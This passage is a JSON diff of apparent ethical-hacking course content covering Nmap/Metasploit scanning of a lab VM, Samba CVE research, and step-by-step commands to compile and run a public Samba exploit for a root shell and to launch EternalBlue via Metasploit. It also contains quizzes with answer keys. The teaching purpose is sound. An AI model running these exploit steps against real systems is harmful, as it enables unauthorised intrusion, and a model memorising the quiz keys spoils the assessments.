+              "text": "##  Thinking About Information Gathering",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089547,
+              "key": "446d4e6c-7280-4bfd-ad94-5956b816078f",
+              "title": "Information Gathering Easy Quiz",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "446d4e6c-7280-4bfd-ad94-5956b816078f",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "You need to run a scan to search all ports.  Why won't this command provide the results you need?\n```bash\nnmap -sT -sU 10.10.10.10 --script=default \n```",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "This syntax is wrong and Nmap will not initiate a scan",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "This syntax is correct but Nmap will throw an error because it requires root privileges",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1604068918473",
+                    "text": "This syntax is correct but Nmap will not scan all ports",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1089548,
+              "key": "2bb22ec8-6f14-4dc7-9d16-69f320a37105",
+              "title": "Information Gathering Hard Quiz",
+              "semantic_type": "CheckboxQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "2bb22ec8-6f14-4dc7-9d16-69f320a37105",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Which of these are valid Nmap scripts?",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "smb-vuln-ms06-025.nse",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "smb-vuln-ms07-029.nse",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1604068589305",
+                    "text": "smb-vuln-ms08-067.nse",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1604068592132",
+                    "text": "smb-vuln-ms09-031.nse",
+                    "is_correct": false
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089553,
+          "key": "d4f785ff-e78c-4240-aee2-803487069788",
+          "title": "Exercise: Reconnaissance on TestLab",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "d4f785ff-e78c-4240-aee2-803487069788",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089550,
+              "key": "bb358750-8a80-4f55-baf4-773e98163497",
+              "title": "Exercise: Information Gathering Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Information Gathering Using Metasploit",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089551,
+              "key": "29211582-ebb6-450f-aebe-fffbb69a0290",
+              "title": "Exercise: Information Gathering Instructions",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Your task is to perform information gathering and build a target database on TestLab using your Analyst VM.\n\nFor this exercise, you will use the TestLab virtual machine (<a href=\"https://udacity-ehnd.s3-us-west-2.amazonaws.com/Ethical+Hacker/TestLab.ova\" target=\"_blank\">TestLab.ova</a>) and target `10.10.10.15`. \n\nFollow the tasks below to complete the exercise:",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089552,
+              "key": "01982909-3e7f-4b4a-8234-d404d4212754",
+              "title": "Information Gathering On TestLab",
+              "semantic_type": "TaskListAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "01982909-3e7f-4b4a-8234-d404d4212754",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "tasks": [
+                "Perform a **TCP scan on all ports** of the target",
+                "Perform **service version** and **operating system detection** scans using the identified open ports",
+                "Check the **target database** and analyze the data you gathered",
+                "Find the exact numeric version of service running on **port 139**"
+              ],
+              "positive_feedback": "Great job!  You can see my solution in the next video.",
+              "video_feedback": null,
+              "description": ""
+            }
+          ]
+        },
+        {
+          "id": 1089558,
+          "key": "1dac9be2-a2b7-46b6-aebb-ef274dfd7ff6",
+          "title": "Solution: Reconnaissance on TestLab",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "1dac9be2-a2b7-46b6-aebb-ef274dfd7ff6",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089554,
+              "key": "689f7696-3d8e-444e-846c-966109e1a706",
+              "title": "Solution: Information Gathering Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## My Solution",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089555,
+              "key": "99f2ce18-bdf6-43a3-81e2-c12937e4bcc2",
+              "title": "ND350 EHND C1 L2 A07 Solution Reconnaissance On TestLab V4",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "YBjrpvrjHWk",
+                "china_cdn_id": "YBjrpvrjHWk.mp4"
+              }
+            },
+            {
+              "id": 1089556,
+              "key": "9b455177-7d81-4510-aad1-413e9729d445",
+              "title": "Solution: Information Gathering Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "1. Open your **Metasploit** console\n```bash\nmsfconsole\n```\n1. Create a new workspace \n```bash\nworkspace -a testlab\n```\n1. Change the workspace to the `testlab` workspace\n```bash\nworkspace testlab\n```\n1. Scan all ports using the Nmap all ports scan:  \n```bash\ndb_nmap -p- 10.10.10.15\n```\n1. Run another scan on the identified ports with **service version detection and operating system detection**\n```bash\ndb_nmap -p22,80,111,139,443,32768 -sV -O 10.10.10.15\n```\n1. To identify the exact version of the Samba service, select the`smb_version` scanner module of Metasploit\n```bash\nuse auxiliary/scanner/smb/smb_version\n```\n1. Set the remote host (i.e. the target host) to the target’s IP address.\n```bash\nset RHOSTS 10.10.10.15\n```\n1. Use the `exploit` or `run` command to get the exact samba service version <br><br>\n1. To check the** target database** for results, use commands `hosts` and `services`",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089557,
+              "key": "19e5e5a0-3527-4065-8fd1-d85ea9a1fb76",
+              "title": "Thinking Like An Ethical Hacker",
+              "semantic_type": "ValidatedQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "19e5e5a0-3527-4065-8fd1-d85ea9a1fb76",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "In this exercise, We followed a staged scan divided into two phases.\n\n1. We found all the open ports\n2. We selected the open ports and then scanned them for version detection\n\nWhy do you think we didn't use the `-sV` and `-O` options in the first step?",
+                "matchers": [
+                  {
+                    "expression": "[^/s]+"
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089565,
+          "key": "56c00371-8f1e-4153-8b70-01b31dd045c8",
+          "title": "Researching Vulnerabilities and Exploits",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "56c00371-8f1e-4153-8b70-01b31dd045c8",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089559,
+              "key": "cae2ffbf-1d8b-445c-ae60-c6a30b657809",
+              "title": "Researching Vulnerabilities Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Researching Vulnerabilities",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089560,
+              "key": "02713401-348d-419c-9d23-9c4803af351c",
+              "title": "ND350 EHND C1 L2 A08 Researching Vulnerabilities V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "GpVnE7Ok8-Y",
+                "china_cdn_id": "GpVnE7Ok8-Y.mp4"
+              }
+            },
+            {
+              "id": 1089561,
+              "key": "352686ac-b2d0-4a09-9371-34cb6500f51b",
+              "title": "Researching Vulnerabilities Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "The job of an Ethical Hacker is to find known vulnerabilities as they have the highest chances of being exploited. A Common Vulnerability Exposure  (CVE) is assigned by organizations to products affected globally. \n\n### Important Elements of CVE\n\n* **Vulnerability Description: ** brief information about the vulnerability\n* **CVSS Vector**: base and temporal score related information\n* **Products Affected**: all of the affected products by the vulnerability\n* **Vulnerability Type**:  type of weakness\n\n### Type Of Vulnerabilities\n\n* **Denial of Service (DOS)** is a vulnerability that affects the availability of the system by crashing the services or applications, stopping processes, or increasing the system's workload.\n* **Execution (EXEC)** is a vulnerability that allows an attacker to run running a command or code on the system.\n* **Memory Corruption/Overflows** **(MC/BO)** generally occur due to improper handling of resources. These can indirectly affect CIA by leaving the system vulnerable to DOS or code execution attacks.\n* **Application-based vulnerabilities** like XSS, CSRF, SQLI, etc. (We will study these in the next lesson)\n\n<hr>",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1101798,
+              "key": "91efd963-95a8-4c8c-b368-6327f0ee08cd",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Researching Exploits",
+              "instructor_notes": null
+            },
+            {
+              "id": 1101800,
+              "key": "8e2af60f-081f-4a7e-ac0a-f0f0977fbe85",
+              "title": "ND350 EHND C1 L2 A10 Researching Exploits V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "wrS1frXuXFs",
+                "china_cdn_id": "wrS1frXuXFs.mp4"
+              }
+            },
+            {
+              "id": 1102171,
+              "key": "a8f6197c-daec-4f36-94c1-438be2752ab9",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Researching Exploits Is An Important Skill\n\nYou cannot take advantage of a vulnerability if there is no exploit against it.\n\n### Three Types Of Exploit Codes\n\n* **Proof of concept / Analysis of vulnerability **refers to incomplete exploits. These are often long and detailed articles describing the vulnerability. These can be used by experienced exploit writers to develop an exploit from scratch.  They can also be used by an Ethical Hacker to manually send requests and execute the exploit in a step-by-step process.\n* **Public Exploits **are community-driven and can be risky to use. They are typically shared as raw code that will need to be modified to work in the target environment.\n* **Commercial Exploits **are developed by a reputable vendor. The vendors do a significant amount of research and testing in multiple environments so they are considered quite safe. A vendor may also be able to provide exact metrics on how the exploit can affect the CIA (Confidentiality, Availability, and Integrity) of the target system.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126560,
+              "key": "1b91f219-66d0-466d-9ef5-4be928605a56",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms \n\n| Term | Definition |\n|-|-|\n| CVE (Common Vulnerability Exposure) | A list of known information security vulnerabilities | ",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122945,
+              "key": "55c3cfb8-1313-45ad-8935-8b30eb5b9139",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\n* If you want to learn more about CVEs, read this article from Red Hat:  <a href=\"https://www.redhat.com/en/topics/security/what-is-cve\" target=\"_blank\">What is a CVE?</a>. It explains how the CVE system works, discusses requirements for assigning CVE's, and shares some interesting takeaways.   \n* Rapid7 has written an eye-opening article comparing public exploits and commercial exploits<a href=\"https://blog.rapid7.com/2012/12/27/security-death-match-open-source-vs-pay-for-play-exploit-packs/\" target=\"_blank\">: Security Death Match: Open Source vs. Pay-for-Play Exploit Packs</a>",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089569,
+          "key": "df210c28-0d26-40d6-878b-0db7a63d53ae",
+          "title": "Quizzes: Vulnerabilities and Exploits",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "df210c28-0d26-40d6-878b-0db7a63d53ae",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089566,
+              "key": "7c9c29e5-c835-466c-9000-11907172545a",
+              "title": "Researching Vulnerabilities Quizzes Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "##  Thinking About Researching Vulnerabilities",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1094119,
+              "key": "edb1f421-f58a-411f-83fc-a8b4e477e825",
+              "title": "Matching Quiz",
+              "semantic_type": "MatchingQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "edb1f421-f58a-411f-83fc-a8b4e477e825",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "complex_prompt": {
+                  "text": "Order the tasks for researching a known vulnerability"
+                },
+                "concepts_label": "Order",
+                "answers_label": "Task",
+                "concepts": [
+                  {
+                    "text": "Step 1",
+                    "correct_answer": {
+                      "id": "a1604071792298",
+                      "text": "Create a target database with services and ports"
+                    }
+                  },
+                  {
+                    "text": "Step 2",
+                    "correct_answer": {
+                      "id": "a1604071836152",
+                      "text": "Check for CVE's related to that service or port"
+                    }
+                  },
+                  {
+                    "text": "Step 3",
+                    "correct_answer": {
+                      "id": "a1604071838535",
+                      "text": "Shortlist the CVE's based on the type of vulnerability or Risk Score"
+                    }
+                  },
+                  {
+                    "text": "Step 4",
+                    "correct_answer": {
+                      "id": "a1604071844636",
+                      "text": "Analyze the details like description, analysis, references, etc."
+                    }
+                  }
+                ],
+                "answers": [
+                  {
+                    "id": "a1604071844636",
+                    "text": "Analyze the details like description, analysis, references, etc."
+                  },
+                  {
+                    "id": "a1604071838535",
+                    "text": "Shortlist the CVE's based on the type of vulnerability or Risk Score"
+                  },
+                  {
+                    "id": "a1604071836152",
+                    "text": "Check for CVE's related to that service or port"
+                  },
+                  {
+                    "id": "a1604071792298",
+                    "text": "Create a target database with services and ports"
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1089567,
+              "key": "646f615f-9c39-45f1-a743-e60a3adde10a",
+              "title": "Researching Vulnerabilities Easy Quiz",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "646f615f-9c39-45f1-a743-e60a3adde10a",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "What does it mean if a CVE has an **Authentication** metric set to **Single**?",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "You need to own a system to exploit this vulnerability",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "You need a system on the same network to exploit this vulnerability",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1604069982062",
+                    "text": "You need valid system credentials or a user account to exploit this vulnerability ",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "a1604070110735",
+                    "text": "You can only attack a single system with this vulnerability",
+                    "is_correct": false
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089573,
+          "key": "d73f4e21-17ad-49f9-a142-6b980f1e4ffc",
+          "title": "Exercise: Research Samba",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "d73f4e21-17ad-49f9-a142-6b980f1e4ffc",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089570,
+              "key": "25d791b7-79ff-4bd7-8de0-278ecf81ef62",
+              "title": "Exercise: Researching Vulnerabilities Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Researching Vulnerabilities in Samba",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089571,
+              "key": "5900fa77-66c9-47cd-a604-70dc079c5709",
+              "title": "Exercise: Researching Vulnerabilities Instructions",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Your task is to look up the CVE and Exploits available for the **samba 2.2.1a** related vulnerabilities. \n\n### Requirements\n\n* The CVSS Score should be `10.0`\n* The vulnerability type should be `EXEC Code Overflow`\n* Commercial Exploits should be available\n\nFollow the tasks given below to complete the exercise.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089572,
+              "key": "87986d45-8cd4-48b7-9672-d03b9a00d5c4",
+              "title": "CVE and Exploit Research",
+              "semantic_type": "TaskListAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "87986d45-8cd4-48b7-9672-d03b9a00d5c4",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "tasks": [
+                "Find the **samba 2.2.1a** related CVEs",
+                "Filter your results  based on the listed requirements",
+                "Find its public exploit",
+                "Find its PoC / Analysis"
+              ],
+              "positive_feedback": "Nice work!  You can see my solution in the next video.",
+              "video_feedback": null,
+              "description": ""
+            }
+          ]
+        },
+        {
+          "id": 1089578,
+          "key": "a823765b-97f7-429b-942a-b02a004fe84a",
+          "title": "Solution: Research Samba",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "a823765b-97f7-429b-942a-b02a004fe84a",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089574,
+              "key": "a5a53daa-21e4-4932-8384-e5f3ccf2ebad",
+              "title": "Solution: Researching Vulnerabilities Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## My Solution",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089575,
+              "key": "ec84cab7-7da8-497e-891d-b12ad0cabd7a",
+              "title": "ND350 EHND C1 L2 A09 Solution Research On Samba V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "OdDPzLNw2Lw",
+                "china_cdn_id": "OdDPzLNw2Lw.mp4"
+              }
+            },
+            {
+              "id": 1089576,
+              "key": "4099e37b-6963-4324-be4c-81a6f771f75a",
+              "title": "Solution: Researching Vulnerabilities Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "1. Use the internet to search for related CVEs, e.g. ***samba 2.2.1a CVE***\n1. Click on the link for CVE Details and look through the results for a CVE that meets the requirements:\n   * CVE score: 10\n   * Vulnerability type: `EXEC Code Overflow`\n   * Commercial exploits are available\n1. **CVE-2003-0201** meets the requirements\n1. Use the internet to search for exploits, e.g. ***CVE-2003-0201*** \n1. One of the results is from **exploit-db**.  This meets the requirement of a public exploit.  Go to   <a href=\"https://www.exploit-db.com/exploits/7\" target=\"_blank\">https://www.exploit-db.com/exploits/7</a>  to see the details.\n1. Use the internet to search for exploits, e.g. ***CVE-2003-0201*** analysis  \n1. Find a link to the National Vulnerability Database and click on it: <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2003-0201\" target=\"_blank\">https://nvd.nist.gov/vuln/detail/CVE-2003-0201</a> \n1. Explore the items in the **References** section to find a PoC/Analysis",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089577,
+              "key": "889d165f-5e17-443c-8e4b-8ba059e46e4f",
+              "title": "Thinking Like an Ethical Hacker",
+              "semantic_type": "ValidatedQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "889d165f-5e17-443c-8e4b-8ba059e46e4f",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "CVE-2003-0201 found in this exercise has a score of 10 but still says that admin credentials are required.\nIs the CVSS score wrong?",
+                "matchers": [
+                  {
+                    "expression": "[^/s]+"
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089585,
+          "key": "d678d114-994f-44b2-a605-701ad7484525",
+          "title": "Executing Exploits",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "d678d114-994f-44b2-a605-701ad7484525",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": {
+            "files": [
+              {
+                "name": "exp.c",
+                "uri": "https://video.udacity-data.com/topher/2021/January/60011f1b_exp/exp.c"
+              }
+            ],
+            "google_plus_link": null,
+            "career_resource_center_link": null,
+            "coaching_appointments_link": null,
+            "office_hours_link": null,
+            "aws_provisioning_link": null
+          },
+          "atoms": [
+            {
+              "id": 1089579,
+              "key": "fb82df31-e013-4e84-8271-19c833b63593",
+              "title": "Executing Exploits Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Executing Public Exploits",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089580,
+              "key": "227a6ad8-6bc9-453e-9351-1c502e3dee56",
+              "title": "ND350 EHND C1 L2 A11a Executing Public Exploits V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "GbR5VpCXsJ4",
+                "china_cdn_id": "GbR5VpCXsJ4.mp4"
+              }
+            },
+            {
+              "id": 1089581,
+              "key": "03549fa0-7b9e-4aeb-b414-d2ea438c0442",
+              "title": "Executing Exploits Notes",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Process For Executing A Public Exploit\n\n* **Modify** the exploit according to your needs (eg: LHOST, LPORT, RHOST, RPORT)\n* **Compile **the raw code into an executable file\n* **Debug **the code by looking after the errors and dependency issues\n* **Run **the exploit on the target",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1126367,
+              "key": "a9499b70-0af8-49b3-8986-7460d314f85c",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Steps To Compile A Public Exploit",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126361,
+              "key": "cf18d146-ed1c-4c4c-9d19-691e8f60cecb",
+              "title": "ND350 EHND C1 L2 A11b Compile An Exploit V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "Wa4nYlAaMOQ",
+                "china_cdn_id": "Wa4nYlAaMOQ.mp4"
+              }
+            },
+            {
+              "id": 1101780,
+              "key": "0d6c22a3-51cf-4283-9d0e-ffd60bc78965",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Target Machine - 10.10.10.15 (You should practice this hence we are  doing it on your test lab)\n\nDownload the exploit code in your Analyst Machine - <a href=\"https://udacity-ehnd.s3-us-west-2.amazonaws.com/Ethical+Hacker/exp.c\" target=\"_blank\">exp.c</a>\n\n1. Open the exploit in a text editor and read it. (There is a comment on top which tells us how to compile it)\n1. Compile the exploit using gcc with the command `gcc -o exp exp.c  -lcrypto`\n1. You will get an error `openssl/ssl.h: No such file or directory`\n1. Copy the error and research the solution on the internet\n1. This error occurs because a package called libssl-dev is missing. To install it, use `apt-get install libssl-dev`",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126366,
+              "key": "d59fccc4-df77-4dda-bf7a-afed074da35d",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Steps To Execute The Compiled Exploit",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126363,
+              "key": "bcbfa9b1-4f7a-4e6a-acfc-67b53345a72b",
+              "title": "ND350 EHND C1 L2 A11c Execute An Exploit V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "ZCmuVkMw1p4",
+                "china_cdn_id": "ZCmuVkMw1p4.mp4"
+              }
+            },
+            {
+              "id": 1126362,
+              "key": "357c4262-f852-4888-9d0b-e5d7d8b3fe06",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "1. Run the exploit  using `./exp`\n1. Exploit requires additional information. Usage shown to us is **./exp target box [port] [-c N]** where the **target **and** port **are to be selected using the information in the **target database**. In our environment, it is.`./exp 0x6b 10.10.10.15 443 -c 50`\n1. Exploit takes quite some time to spawn a fully-rooted shell. Confirm the hack by running the command **hostname** and the output should be **testlab.example.com**",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126561,
+              "key": "118273fb-e4d1-4652-8b68-3bc4ebbe4c32",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms \n\n| Term | Definition |\n|-|-|\n| Compiler | Software that converts source code into an executable file | \n| Listening Host (LHOST) | The IP Address of the machine where a listener is running | \n| Listening Port (LPORT)  | The open port on the machine where a listener is running | \n| Payload | The malicious code that infects a target system | \n| Remote Host (RHOST) | The target's IP Address | \n| Remote Port (RPORT) | The open port on the target's machine | ",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122946,
+              "key": "c37d0765-651f-4e68-9804-8e5b541465cd",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nThis blog post contains some helpful notes about compiling exploits:  <a href=\"https://medium.com/@_____________/compiling-exploits-4ec7bb9ec03c\" target=\"_blank\">Compiling Exploits</a>. Some portions of this article may not make sense to you right now but as you progress through your career, it will be easier to see their relevance in real-world situations.",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1126589,
+          "key": "8fb9e34f-9903-40c1-b016-20a94552ca8c",
+          "title": "Commercial Exploits",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "8fb9e34f-9903-40c1-b016-20a94552ca8c",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1126596,
+              "key": "f68c66d1-bafe-406a-968d-1cc3853c50a6",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Executing Commercial Exploits",
+              "instructor_notes": null
+            },
+            {
+              "id": 1126598,
+              "key": "21961c59-0f6f-4e33-b188-79d17f4118e3",
+              "title": "ND350 EHND C1 L2 A12a Executing Commercial Exploits V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "dtya-zKvgG4",
+                "china_cdn_id": "dtya-zKvgG4.mp4"
+              }
+            },
+            {
+              "id": 1126599,
+              "key": "a4470812-c53a-48fb-910b-787c9748fe23",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Process For Executing A Commercial Exploit\n\n1. **Search** for an exploit using a keyword\n1. **Load** an exploit as a module\n1. **Tune** the exploit by modifying the options which are required\n1. **Run** the exploit and wait for the results to show up\n\n### Reliability Ranks In Metasploit For Exploit Search\n\n* Manual\n* Low\n* Average\n* Normal\n* Good\n* Great \n* Excellent\n\n### Single vs. Staged Payloads\n\nThe **payload** is the malicious code that is sent to the target system once a weakness has been exploited successfully. The payload may allow an attacker to control the system, take screenshots, record audio, and much more.   \n\nIf the payload code is sent all at once, It is called a **single** (also known as **non-staged** payload) and if the payload code is sent in parts through multiple stages, It is called a **stager** (or **staged payload**)\n\n### Shell vs. Meterpreter Payload Types\n\n**Shell** is a simple payload that gives remote access to the system console. It will be a command prompt if the target is running Windows or a terminal if the target is running macOS or Linux. \n\n**Meterpreter** is a more advanced payload with built-in options that depend on the target machine. The Windows Meterpreter provides the most features including taking screenshots, controlling the webcam, keylogging, recording using the microphone, accessing a system shell, escalating privileges to administrator-level, and many more. \n\n### Bind vs. Reverse Connection\n\nThe payload needs to establish a connection between the two machines to give the attacker access to the target machine.\n\nIn a **bind** connection, the attacker's machine connects to the target's machine. This can be used when the target allows inbound connections in its firewall configurations.\n\nIn a **reverse** connection, the target's machine connects back to the attacker's machine. This is helpful when the target allows only outbound connections in its firewall configurations.",
+              "instructor_notes": null
+            },
+            {
+              "id": 1131021,
+              "key": "bcf42969-4727-417d-a547-4edd9f756737",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Using Metasploit",
+              "instructor_notes": null
+            },
+            {
+              "id": 1131020,
+              "key": "c2d164bb-264b-48b9-8b54-27504b3e952c",
+              "title": "ND350 EHND C1 L2 A12b Metasploit Demo Part 1 V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "T98NSvVGPoE",
+                "china_cdn_id": "T98NSvVGPoE.mp4"
+              }
+            },
+            {
+              "id": 1126603,
+              "key": "4f37098f-719b-496c-a8b2-43033e20a19d",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Step-by-step Instructions to Execute an Exploit\n\n\n\nExploit Name - MS17-010 (Eternal Blue). \nExploit Location - Metasploit-Framework\n\n### Instructions\n\n1. Open a terminal and launch the Metasploit console\n```bash\nmsfconsole\n```\n<br>\n1. Search for the available exploits using the** search type:exploit (exploit-keyword)**\n```bash\nsearch type:exploit eternalblue\n```\n<br>\n1. Use the exploit with the **use (exploit-module-number)**\n```bash\nuse 2\n```\n<br>\n1. To check for the available payloads, you may use `show payloads` command  and set the payload using `set payload <payload number>`\n```bash\nset payload 208\n```",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1131022,
+              "key": "051423d2-4be0-41cd-a1bb-bfcb7dd0027b",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Using Metasploit Part, cont.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1131023,
+              "key": "150f6845-19aa-432c-b32f-46ea06c02e87",
+              "title": "ND350 EHND C1 L2 A12b Metasploit Demo Part 2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "5MTLrt5HCFk",
+                "china_cdn_id": "5MTLrt5HCFk.mp4"
+              }
+            },
+            {
+              "id": 1131024,
+              "key": "25500b06-575c-4e68-a6ed-0b73c573d953",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
